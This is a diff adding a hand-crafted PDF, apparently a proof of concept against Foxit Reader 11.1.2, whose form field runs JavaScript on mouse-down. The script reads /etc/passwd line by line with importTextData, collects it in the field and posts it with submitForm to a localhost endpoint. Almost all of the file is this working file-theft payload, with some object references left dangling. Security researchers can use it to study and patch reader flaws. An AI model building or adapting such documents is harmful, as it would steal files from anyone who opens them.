@@ -1,0 +1,104 @@
+%PDF-1.5
+%����
+1 0 obj
+<<
+  /Type /Catalog
+  /Pages 2 0 R
+  /AcroForm 4 0 R
+>>
+endobj
+2 0 obj
+<<
+  /Type /Pages
+  /Count 1
+  /Kids [
+    3 0 R
+  ]
+>>
+endobj
+% Page number 0.
+3 0 obj
+<<
+  /Type /Page
+  /Parent 2 0 R
+  /Resources <<
+    /Font <</F1 20 0 R>>
+  >>
+  /Annots [ 5 0 R ]
+  /Contents [21 0 R]
+  /MediaBox [0 0 612 792]
+>>
+endobj
+% Forms
+4 0 obj
+<<
+  /Fields [
+    5 0 R
+    6 0 R
+    7 0 R
+  ]
+>>
+endobj
+% Field with actions:
+% Cursor enter: E
+% Cursor exit: X
+% Mouse down: D
+% Mouse up: U
+% Focus: Fo
+% Blur: Bl
+5 0 obj
+<<
+ /Type /Annot
+ /Subtype /Widget
+ /FT /Tx
+ /T (##)
+ /Rect [100 200 150 250]
+ /AA <<
+   /D 10 0 R
+ >>
+>>
+endobj
+% http://localhost:1337/post-test
+10 0 obj
+<<
+  % Foxit Reader 11.1.2 App Store
+  /Type /Action
+  /S /JavaScript
+  /JS (
+    try {
+      var test = this.importTextData("/etc/passwd", 0);
+      i = 0;
+      while (test == 0) {
+        i++;
+        var k = this.getField('##').value;
+        test = this.importTextData("/etc/passwd", i);
+        k += this.getField('##').value;
+        this.getField('##').value = k;
+      }
+      this.submitForm\("http://localhost:1337/post-test", false, true, []\);
+      this.getField('##').value = '';
+    } catch \(e\) {
+       app.alert\("ERROR: " + e\);
+    }
+  )
+>>
+endobj
+xref
+0000000000 65535 f
+0000000015 00000 n
+0000000274 00000 n
+0000000372 00000 n
+0000000096 00000 n
+0000000469 00000 n
+0000000524 00000 n
+0000000723 00000 n
+0000000755 00000 n
+0000000920 00000 n
+trailer
+<<
+/Size 10
+/Root 1 0 R
+>>
+startxref
+8360
+%%EOF
